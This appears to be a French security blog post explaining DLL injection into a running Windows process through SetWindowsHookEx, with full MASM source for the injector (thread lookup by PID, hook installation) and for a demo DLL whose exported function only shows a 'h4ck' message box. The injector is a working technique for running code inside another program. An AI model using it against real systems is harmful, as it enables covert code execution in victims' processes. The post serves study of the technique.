
Est présenté dans cet article une manière d'effectuer de l'injection de DLL via la fonction __SetWindowsHookEx()__.

Cet article fait suite aux articles précédents:

* https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/

* https://dokyx.fr/blog/uyniouliu_injectdll_ntcreatethreadex/

* https://dokyx.fr/blog/lsdjqfqf_injectdll_rtlcreateuserthread/

Dans les articles précédents, on était partis au fur et à mesure dans l'étude de fonctions non docummentées de Windows, ce qui nécessitait d'user de méthode de reverse engineering. A présent, on rebascule sur une fonction documentée: __SetWindowsHookEx()__ qui est présente dans la DLL __User32.dll__.

La msdn de la fonction __SetWindowsHookEx()__ (https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa) nous dit que cette fonction permet de mettre en place une procédure de __**hook**__ dans une __chaine de **hooks**__. Un **hook** permet de remplacer **quelque chose** par un **machin**, puis de remettre ce **quelque chose** une fois le **machin** exécuté.

Dans ce cas précis, la fonction __SetWindowsHookEx()__ permet de capturer des évenements Windows afin d'effectuer des actions lors d'un déplacement de souris, d'une frappe clavier, d'un message, etc. La liste des **hooks** disponible en utilisant la fonction __SetWindowsHookEx()__ est présentée ci-dessous, et est bien évidemment disponible dans la msdn de la fonction:

```
| ------------------------------------------------------------------ | 
| WH_CALLWNDPROC: 4     | WH_CALLWNDPROCRET: 12 | WH_CBT: 5          |
| WH_DEBUG: 9           | WH_FOREGROUNDIDLE: 11 | WH_GETMESSAGE: 3   |
| WH_JOURNALPLAYBACK: 1 | WH_JOURNALRECORD: 0   | WH_KEYBOARD: 2     |
| WH_KEYBOARD_LL: 13    | WH_MOUSE: 7           | WH_MOUSE_LL: 14    |
| WH_MSGFILTER: -1      | WH_SHELL: 10          | WH_SYSMSGFILTER: 6 |
| ------------------------------------------------------------------ | 
```

Le mécanisme de cette injection de DLL est très simple, il va consister à mettre une place une procédure de **hook** pour une interruption clavier (ou souris, ou autres) sur l'application cible. Une fois cette interruption détectée, une fonction définie en avance de phase et présente dans la DLL malveillante sera exécutée dans le thread du processus victime. 

Pour ces exemples d'injection de DLL, j'utilise toujours le logiciel victime __HxD__. Je ne vais pas déroger à cette règle.

Lorsque le mécanisme de **hook** aura été mis en place, il me suffira d'écrire un texte (si je **hook** une interruption clavier ) dans __HxD__ pour déclencher le chargerement ma DLL en mémoire et ainsi exécuter une fonction de ma DLL que j'aurais exportée lors de la compilation de la DLL (elle s'appelera __myFunc()__).

Comme ma DLL n'est pas initialement chargée en mémoire par Windows, je ne peux pas directement faire appel à ma fonction __myFunc()__. Je commence donc par charger ma DLL en mémoire avec __LoadLibraryA()__ (kernel32.dll), puis je retrouve l'adresse de __myFunc()__ avec __GetProcAddress()__ (kernel32.dll) comme suit:

```
.data
    dllPath     db "C:\Users\User 1\Desktop\inject.dll",0
    func_to_inject  db "myFunc", 0

.data?
    hDll        dd ?
    hFunc       dd ?

.code
    push    offset dllPath
    call    LoadLibraryA
    mov     [hDll], eax

    push    offset func_to_inject
    push    eax
    call    GetProcAddress
    mov     [hFunc], eax
```

Il faut savoir que l'on ne peut utiliser __SetWindowsHookEx()__ que sur un **thread** en cours, et non sur un processus. Chaque processus contient au moins 1 thread. En effet, un processus n'exécute pas de code, il contient des threads et leurs fournis un espace d'adresses virtuelles dans lesquelles évoluer. Ce sont donc les threads qui exécutent du code. Ainsi, un processus doit au moins contenir un thread afin d'exécuter le code du programme que l'on souhaite exécuter.

Le défis consiste à retrouver le thread de notre processus victime sachant que l'on connait le __Process IDentifier__ (PID) de notre process car il est publiquement disponible.

Je vais utiliser la fonction __CreateToolhelp32Snapshot()__ (kernel32.dll) qui permet d'effectuer un **snapshot** d'un processus en cours. On trouvera notamment dans ce snapshot les différents __Thread IDentifier__ (TID). Il faut alors parcourir ces __TID__, puis trouver celui qui appartient à notre processus victime. Pour cela, j'utiliserais les fonctions __Thread32First()__ (kernel32.dll) et __Thread32Next()__ (kernel32.dll) pour parcourir la structure du **snapshot**.

En parlant de structure du **snapshot**, celle-ci est présentée ci-dessous:

```
typedef struct tagTHREADENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ThreadID;
  DWORD th32OwnerProcessID;
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32;
```

On y voit bien le __th32ThreadID__ qui est le __TID_ de thread, et le __th32OwnerProcessID__ qui est son __PID__.

Le **snapshot** est crée comme suit:

```
.data
    PID         dd 13284

.data?
    hSnapshot   dd ?

.code
    mov     eax, PID
    push    eax
    push    4 ; TH32CS_SNAPTHREAD
    call    CreateToolhelp32Snapshot
    mov     [hSnapshot], eax
```

Et pour comparer le PID du processus exécutant le thread avec celui dans le **snapshot** j'utilise le code suivant (remarquer la référence à __th32OwnerProcessID__ qui permet de s'assurer que l'on regarde bien le processus victime):

```
tagTHREADENTRY32 struct
    dwSize      dd ?
    cntUsage    dd ?
    th32ThreadID    dd ?
    th32OwnerProcessID dd ?
    tpBasePri   dd ?
    tpDeltaPri  dd ?
    dwFlags     dd ?
tagTHREADENTRY32 ends

.data
    tte32   tagTHREADENTRY32 <sizeof tagTHREADENTRY32>

.code
; get the first thread in the snapshot
    push    offset tte32
    push    [hSnapshot]
    call    Thread32First

; compare the PID owner of the thread with the PID of the process to inject
loop_to_find_thread:
    mov     ebx, PID
    cmp     [tte32.th32OwnerProcessID], ebx
    jz      thread_found
   
    push    offset tte32
    push    [hSnapshot]
    call    Thread32Next

    jmp     loop_to_find_thread 

thread_found:
```

Et enfin, je met le **hook** en place grâce à la fonction __SetWindowsHookEx()__ sur le thread spécifié par le __th32ThreadID__ du processus victime:

```
.data?
    hHook       dd ?

.code
    push    tte32.th32ThreadID
    push    hDll
    push    hFunc
    push    2 ; WH_MOUSE: 7, WH_KEYBOARD: 2
    call    SetWindowsHookExA
    mov     [hHook], eax
```

Cette méthode de mise en place de **hook** est d'ailleurs présentée dans la documentation msdn ... bah voyons (https://docs.microsoft.com/fr-fr/windows/win32/winmsg/using-hooks).

Il suffit ensuite d'attendre que l'utilisateur effectue une interruption clavier, souris, ... sur le processus/thread victime afin de mettre en place la chaine de **hooks** qui exécutera la fonction __myFunc()__ de notre DLL malveillante.

<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de DLL via SetWindowsHookEx()</font></summary>
<p>
```
.586
.model flat, stdcall

; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
LoadLibraryA PROTO STDCALL :DWORD
GetProcAddress PROTO STDCALL :DWORD, :DWORD
CreateToolhelp32Snapshot PROTO STDCALL :DWORD, :DWORD
Thread32First PROTO STDCALL :DWORD, :DWORD
Thread32Next PROTO STDCALL :DWORD, :DWORD
Sleep PROTO STDCALL :DWORD

; user32.dll
SetWindowsHookExA PROTO SDTCALL :DWORD, :DWORD, :DWORD, :DWORD
UnhookWindowsHookEx PROTO STDCALL :DWORD


;https://www.elastic.co/fr/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
; https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types

tagTHREADENTRY32 struct
    dwSize      dd ?
    cntUsage    dd ?
    th32ThreadID    dd ?
    th32OwnerProcessID dd ?
    tpBasePri   dd ?
    tpDeltaPri  dd ?
    dwFlags     dd ?
tagTHREADENTRY32 ends

.data
    dllPath     db "C:\Users\User 1\Desktop\inject.dll",0
    func_to_inject  db "myFunc", 0
    tte32       tagTHREADENTRY32 <sizeof tagTHREADENTRY32>
    PID         dd 13284
    
.data?
    hDll        dd ?
    hFunc       dd ?
    hSnapshot   dd ?
    hHook       dd ?


.code
Start PROC
    
; modify the DLL using CFF Explorer to modify the name of the exported function to be myFunc !!
    push    offset dllPath
    call    LoadLibraryA
    mov     [hDll], eax

    push    offset func_to_inject
    push    eax
    call    GetProcAddress
    mov     [hFunc], eax

; Snapshot of process to get threads
    mov     eax, PID
    push    eax
    push    4 ; TH32CS_SNAPTHREAD
    call    CreateToolhelp32Snapshot
    mov     [hSnapshot], eax

; get the first thread in the snapshot
    push    offset tte32
    push    [hSnapshot]
    call    Thread32First

; compare the PID owner of the thread with the PID of the process to inject
loop_to_find_thread:
    mov     ebx, PID
    cmp     [tte32.th32OwnerProcessID], ebx 
    jz  thread_found
    
    push    offset tte32
    push    [hSnapshot]
    call    Thread32Next

    jmp     loop_to_find_thread  


thread_found:
    push    tte32.th32ThreadID
    push    hDll
    push    hFunc
    push    2 ; WH_MOUSE: 7, WH_KEYBOARD: 2
    call    SetWindowsHookExA 
    mov     [hHook], eax

    push    2710h ; = 10000 ms = 10 s to tirg the mecanism: keyboard, mouse ..
    call    Sleep

    push    [hHook]
    call    UnhookWindowsHookEx

go_out:
    xor     eax, eax
    push    eax
    call    ExitProcess

Start ENDP
End
```
</p>
</details>

Ici, on peut constater que j'ai effectué un __Sleep()__ de 10 seconde, et ce afin de me laisser le temps de switcher sur le processus victime afin de déclencher mon interuption. En pratique, il ce n'est pas une bonne méthode ... n'est ce pas?

La DLL utilisée est présentée dans le code ci-dessous. Elle diffère légerement de la DLL utilisée lors des articles précédent, en ce sens que l'**entry point** de la DLL (__DLL\_PROCESS\_ATTACH__) ne doit rien executer de visible par l'utilisateur. En revanche il doit tout de même faire appel à une fonction (je ne sais pas pourquoi, si quelqu'un a la solution ... merci).


<details><summary><font color="red">Ici se trouve le code de la DLL malveillante utilisée</font></summary>
<p>
```
.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL 		dwExitCode:DWORD
MessageBoxA PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD


.data
	sTitle      db  'h4ck', 0
    sMsg		db  'h4ck', 0

.data?
    hInstance dd ?

.code

LibMain PROC hInstDLL:DWORD, reason:DWORD, unused:DWORD
    ; https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
    .if reason == 1 ; DLL_PROCESS_ATTACH
        call nothing

    .elseif reason == 3 ; DLL_THREAD_DETACH
	nop

    .elseif reason == 2 ; DLL_THREAD_ATTACH
    	nop   
    
    .elseif reason == 0 ; DLL_PROCESS_DETACH
      	nop
    .endif

    ret

LibMain ENDP

; function that will be exported
myFunc PROC 
    call    _MessageBox
    ret

myFunc ENDP


nothing PROC
    call GetLastError
    ret
nothing ENDP

_MessageBox PROC
        push        0
        push        offset sTitle
        push        offset sMsg
        push        0 
        call       MessageBoxA

    ret

_MessageBox ENDP

END ; LibMain
```
</p>
</details>

Afin d'exporter la fonction __myFunc__, il faut le spécifer au compilateur/**linkeur** de la manière suivante:

```
ml.exe myDll.asm /link /subsystem:windows /DLL /defaultlib:"kernel32.lib"  /entry:LibMain /out:myDll.dll /def:myDll.def
```

Le paramètre important est: __/def:myDll.def__. Le fichier __myDll.def__ contient:

```
LIBRARY myDll
EXPORTS myFunc
EXPORTS nothing
```

Et voilà, je ne pense pas qu'il soit utile de présenter des screenshots pour cet article car tout est dans le code finalement. Cependant si certaines choses manquent de clarté, n'hésitez pas à revenir vers moi.




